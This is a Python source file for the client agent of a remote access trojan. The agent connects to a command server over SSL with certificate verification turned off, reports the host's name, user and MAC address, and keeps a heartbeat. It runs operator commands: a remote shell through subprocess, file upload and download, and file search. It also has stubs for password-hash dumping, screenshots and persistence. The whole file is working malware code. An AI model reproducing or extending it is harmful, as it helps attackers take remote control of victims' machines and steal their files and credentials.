import base64
import socket, ssl, threading, os, subprocess
import platform, uuid
import hashlib
from getpass import getuser
from time import sleep

from symbols import *

DATA_CHUNK_SIZE = 1024
COMMAND_CHUNK_SIZE = 4096


class Client:

    ####################################################################################################################
    ################################################# CONSTRUCTOR ######################################################
    ####################################################################################################################

    def __init__(self, server_address, server_port, server_beat_port, debug_mode):
        self.server_address = server_address
        self.server_port = server_port
        self.server_beat_port = server_beat_port
        self.beat_listening_port = None
        self.server_sock = None
        self.beat_sock = None
        self.platform = platform.system()
        self.hostname = platform.uname()[1]
        self.user = getuser()
        self.mac = uuid.getnode()
        self.uid = self.getClientUID()
        self.beat_id = None
        self.commands = {
            'shell': self.shell,
            'screenshot': self.screenshot,
            'download': self.download,
            'upload': self.upload,
            'hashdump': self.hashdump,
            'search': self.search,
            'ipconfig': self.ipconfig,
            'kill': self.kill
        }
        self.agent_path = None
        self.is_killed = False
        self.debug = debug_mode
        self.lock = threading.Lock()
        self.is_connected = False

    ####################################################################################################################
    ########################################### CONNECTION HANDLING ####################################################
    ####################################################################################################################

    def create_ssl_socket(self, address):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self.debug_print("SSL context created")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.debug_print("Socket created")
        wrapped_socket = context.wrap_socket(sock, server_hostname=address)
        self.debug_print("Socket wrapped with the SSL context")
        return wrapped_socket

    def create_random_listening_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', 0))  # Bind an available port
        sock.listen(5)
        return sock

    def connect(self):
        self.debug_print("CONNECT", True)
        self.server_sock = self.create_ssl_socket(self.server_address)

        listening_beat_socket = self.create_random_listening_socket()
        self.beat_listening_port = listening_beat_socket.getsockname()[1]  # Get the port number
        try:
            self.server_sock.connect((self.server_address, self.server_port))
            self.debug_print("Connected to the server")
            self.is_connected = True
            information_json = self.getJSONHostInfos()
            self.block_sending_data(information_json.encode())
            self.debug_print("JSON information sent")
            self.start_heartbeat(listening_beat_socket)
            self.debug_print("Heartbeat started before connection to the server")
            self.receive_commands()
        except Exception as e:
            self.debug_print(f"Error during the connection to the server {str(e)}")
            pass

    def start_heartbeat(self, listening_beat_socket):
        self.debug_print("HEARTBEAT", True)

        client_socket, client_address = listening_beat_socket.accept()

        self.beat_id = client_socket.recv(DATA_CHUNK_SIZE)
        self.debug_print("Data received")
        self.debug_print(f"Beat ID :: {int.from_bytes(self.beat_id, byteorder='big')}")

        threading.Thread(target=self.heartbeat).start()
        self.debug_print("Heartbeat loop started")

    def receive_commands(self):
        self.debug_print("MAIN RECEIVE COMMANDS", True)
        threading.Thread(target=self._receive_commands).start()
        self.debug_print("Thread started")

    def _receive_commands(self):
        self.debug_print("THREADED RECEIVE COMMANDS", True)
        while not self.is_killed:
            try:
                # command = self.server_sock.recv(COMMAND_CHUNK_SIZE).decode()
                command = self.base64_receive_data(self.server_sock)
                self.debug_print(f"Data decoded :: {command}")
                if command:
                    command_name, *args = command.split(' ')
                    command_name = command_name.lower()
                    self.debug_print(f"Command received :: {command_name}")
                    if command_name in self.commands:
                        self.commands[command_name](args)
                        self.debug_print("Command executed")
                # else:
                #     self.debug_print("no data received")
            except NotImplementedError as e:
                self.debug_print(f"Error during the execution of the command :: {str(e)}")
                pass
            except Exception as e:
                self.debug_print(f"Error during the reception of the command :: {str(e)}")
                pass

    ####################################################################################################################
    ############################################## USUAL METHODS #######################################################
    ####################################################################################################################

    def main_loop(self):
        self.debug_print("MAIN LOOP", True)
        self.connect()
        while not self.is_killed:
            if not self.is_connected:
                self.connect()

    def getJSONHostInfos(self):
        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\", \"os\": \"{platform.system()}\", \"beat\": \"{self.beat_listening_port}\"}}"

    def getClientUID(self):
        """Create a UID combining the hostname the mac address and the user running the agent"""
        string = f"{self.hostname}{self.mac}{self.user}"
        hostUID = hashlib.sha256(string.encode()).hexdigest()
        return hostUID[:8]

    def kill(self, args):
        self.debug_print("KILL", True)
        self.server_sock.close()
        self.is_killed = True
        self.is_connected = False

    def persistence(self):
        raise NotImplementedError("This method should be implemented by subclasses")

    def send_file(self, file_path):
        """
        generic function to send a file to the agent.
        @param file_path: the path of the file to send
        """
        self.debug_print("SEND FILE", True)
        # if it exists
        if os.access(file_path, os.F_OK):
            self.debug_print(f"File {file_path} exists")
            # if user has permissions to read the file
            if os.access(file_path, os.R_OK):
                self.debug_print(f"User has permissions to read {file_path}")
                try:
                    with self.lock:
                        with open(file_path, 'rb') as f:
                            while chunk := f.read(COMMAND_CHUNK_SIZE):
                                self.server_sock.sendall(chunk)
                                self.debug_print(f"Sending {len(chunk)} bytes")
                        self.server_sock.sendall(SIG_EOF)
                    self.debug_print("End of file")
                except Exception as e:
                    self.debug_print(f"Error during the sending of the file :: {str(e)}")
                    self.block_sending_data(OTHER_ERROR)
            else:
                self.debug_print(f"User doesnt have permissions to read {file_path}")
                # Sending error code if user doesnt have permissions to dump hashes
                self.block_sending_data(ERROR_INSUFFICIENT_PERMS)
        else:
            self.debug_print(f"File {file_path} not found")
            self.block_sending_data(FILE_NOT_FOUND)

    def get_file(self, file_path):
        """
        generic function to get a file from the agent.
        @param file_path: the path of the file to get
        """
        self.debug_print("GET FILE", True)
        file_length = 0
        try:
            with open(file_path, 'w+b') as f:
                while True:
                    data = self.server_sock.recv(DATA_CHUNK_SIZE)
                    self.debug_print(f"Got {len(data)} bytes")
                    if data == SIG_EOF or not data:
                        break
                    if data == FILE_NOT_FOUND:
                        self.debug_print(f"ERROR: The file is not found on the target.")
                        self.delete_file(file_path)
                        return
                    elif data == ERROR_INSUFFICIENT_PERMS:
                        self.debug_print(f"ERROR: Insufficient permissions to get {file_path}.")
                        self.delete_file(file_path)
                        return
                    elif data == OTHER_ERROR:
                        self.debug_print(f"ERROR: An error occurred on the target while getting the file.")
                        self.delete_file(file_path)
                        return
                    f.write(data)
                    file_length += len(data)
            self.debug_print(f'File saved at {file_path} ({file_length} b)')
        except Exception as e:
            self.debug_print(f"Error while getting the file: {e}")
            os.remove(file_path)

    def delete_file(self, filepath):
        self.debug_print("DELETE FILE", True)

        try:
            os.remove(filepath)
            self.debug_print(f"File {filepath} deleted")
        except Exception as e:
            self.debug_print(f"Error while deleting the file: {str(e)}")
            pass

    def debug_print(self, message, is_function=False):
        if self.debug:
            if is_function:
                message = f"[+] {message}"
            print(message)

    def block_sending_data(self, data, sock=None):
        # self.debug_print("BLOCK SENDING DATA", True)
        # self.debug_print(f"Data to send :: {len(data)} bytes")
        # If no socket provided, use the default one self.server_sock (can't be entered as default value for parameter)
        if sock is None:
            # self.debug_print("Using the wrapped socket")
            sock = self.server_sock

        selected_sock = sock

        with self.lock:
            selected_sock.sendall(data)
            # self.debug_print(f"Data sent :: {len(data)} bytes")

    def heartbeat(self):
        self.debug_print("HEARTBEAT THREAD", True)
        while not self.is_killed:
            # self.debug_print("BEAT")
            sleep(1)
            self.beat_sock = self.create_ssl_socket(self.server_address)
            self.beat_sock.connect((self.server_address, self.server_beat_port))
            self.block_sending_data(self.beat_id, self.beat_sock)

    def base64_receive_data(self, socket):
        data = socket.recv(COMMAND_CHUNK_SIZE).decode()
        self.debug_print(f"Data received :: {data} {len(data)} bytes")
        return base64.b64decode(data).decode()

    ####################################################################################################################
    ########################################### CLIENT COMMANDS ########################################################
    ####################################################################################################################

    def download(self, args):
        self.debug_print("DOWNLOAD", True)
        for file_path in args:
            self.get_file(file_path)

    def upload(self, args):
        self.debug_print("UPLOAD", True)
        for file_path in args:
            self.debug_print(f"Uploading {file_path[0]}")
            self.send_file(file_path)

    def search(self, args):
        self.debug_print("SEARCH", True)
        filename = args[1]
        results = []
        for root, dir, files in os.walk(args[0]):
            if filename in files:
                path = os.path.join(root, filename)
                results.append(path)
                self.debug_print(f"File found :: {path}")
        with self.lock:
            for file in results:
                self.server_sock.sendall(file.encode())
            self.server_sock.sendall(SIG_EOF)

    def shell(self, args):
        self.debug_print("SHELL", True)
        while True:
            command = self.base64_receive_data(self.server_sock)
            # command = self.server_sock.recv(COMMAND_CHUNK_SIZE).decode()
            if command.strip().lower() == 'exit':
                self.debug_print("Exiting the shell")
                break
            try:
                if command.lower().startswith('cd '):
                    directory = command[3:].strip()
                    os.chdir(directory)
                    output = f"Changed directory to {os.getcwd()}"
                else:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    self.debug_print(f"Shell command executed :: {command}")
            except Exception as e:
                self.debug_print(f"Error while executing the shell command :: {str(e)}")
                self.server_sock.send(OTHER_ERROR)
                continue
            self.server_sock.send(output.encode())

    def hashdump(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")

    def ipconfig(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")

    def screenshot(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")
